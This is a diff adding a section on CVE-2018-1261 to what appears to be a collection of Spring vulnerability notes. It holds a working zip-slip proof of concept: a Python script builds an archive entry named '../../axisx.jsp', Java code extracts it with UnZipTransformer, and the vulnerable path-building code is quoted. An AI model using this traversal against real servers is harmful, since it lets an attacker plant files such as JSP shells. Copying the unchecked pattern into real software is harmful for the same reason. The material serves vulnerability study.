@@ -396,3 +396,54 @@ private MultiValueMap<String, String> filterSubscriptions(MultiValueMap<String, 
     }
 }
 ```
+## （9）Spring Integration Zip
+### CVE-2018-1261 Arbitrary File Write
+Affected Version: < 1.0.1  
+Diff: https://github.com/spring-projects/spring-integration-extensions/commit/d10f537283d90eabd28af57ac97f860a3913bf9b#diff-990b7a04b25d4c5b7cb46f536ac149b0   
+POC:
+```
+import zipfile
+ 
+if __name__ == "__main__":
+    try:
+        binary = b'this is a axisx test'
+        zipFile = zipfile.ZipFile("./src/main/resources/test.zip", "a", zipfile.ZIP_DEFLATED)
+        info = zipfile.ZipInfo("test.zip")
+        zipFile.writestr("../../axisx.jsp", binary)
+        zipFile.close()
+    except IOError as e:
+        raise e
+	
+ResourceLoader resourceLoader = new DefaultResourceLoader();
+File path =  new File("./targetFolder/");
+final Resource evilResource = resourceLoader.getResource("classpath:test.zip");
+try{
+	InputStream evilIS = evilResource.getInputStream();
+	Message<InputStream> evilMessage = MessageBuilder.withPayload(evilIS).build();
+	UnZipTransformer unZipTransformer = new UnZipTransformer();
+	unZipTransformer.setWorkDirectory(path);
+	unZipTransformer.afterPropertiesSet();
+	unZipTransformer.transform(evilMessage);
+}
+```
+Factor: 
+```
+protected Object doZipTransform(final Message<?> message) throws Exception {
+    public void process(InputStream zipEntryInputStream, ZipEntry zipEntry) throws IOException {
+        final String zipEntryName = zipEntry.getName();
+						
+	if (ZipResultType.FILE.equals(zipResultType)) {
+		final File tempDir = new File(workDirectory, message.getHeaders().getId().toString());
+		tempDir.mkdirs(); //NOSONAR false positive
+		final File destinationFile = new File(tempDir, zipEntryName);
+
+		if (zipEntry.isDirectory()) {
+			destinationFile.mkdirs(); //NOSONAR false positive
+		}
+		else {
+			SpringZipUtils.copy(zipEntryInputStream, destinationFile);
+			uncompressedData.put(zipEntryName, destinationFile);
+		}
+	}
+}
+```
